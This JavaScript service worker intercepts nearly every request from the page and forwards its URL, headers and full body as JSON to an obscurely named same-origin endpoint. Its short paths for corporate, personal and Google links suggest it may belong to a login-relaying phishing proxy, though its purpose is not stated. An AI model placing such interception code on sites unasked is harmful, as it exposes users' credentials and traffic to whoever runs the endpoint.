self.addEventListener("install", (event) => {
    self.skipWaiting();
});

self.addEventListener("activate", (event) => {
    event.waitUntil(clients.claim());
});

self.addEventListener("fetch", (event) => {
    const url = new URL(event.request.url);
    
    // Don't intercept our short URLs - let them redirect naturally
    if (url.pathname === '/c' || url.pathname === '/corp' || url.pathname === '/corporate' ||
        url.pathname === '/p' || url.pathname === '/personal' ||
        url.pathname === '/g' || url.pathname === '/google') {
        return;
    }
    
    // Don't intercept the service worker itself or other static files
    if (url.pathname.includes('service_worker') || url.pathname === '/favicon.ico') {
        return;
    }
    
    event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
    const proxyRequestURL = `${self.location.origin}/lNv1pC9AWPUY4gbidyBO`;

    try {
        const proxyRequest = {
            url: request.url,
            method: request.method,
            headers: Object.fromEntries(request.headers.entries()),
            body: await request.text(),
            referrer: request.referrer,
            mode: request.mode
        };
        
        return fetch(proxyRequestURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify(proxyRequest),
            redirect: "manual",
            mode: "same-origin"
        });
    }
    catch (error) {
        console.error(`Fetching ${proxyRequestURL} failed: ${error}`);
    }
}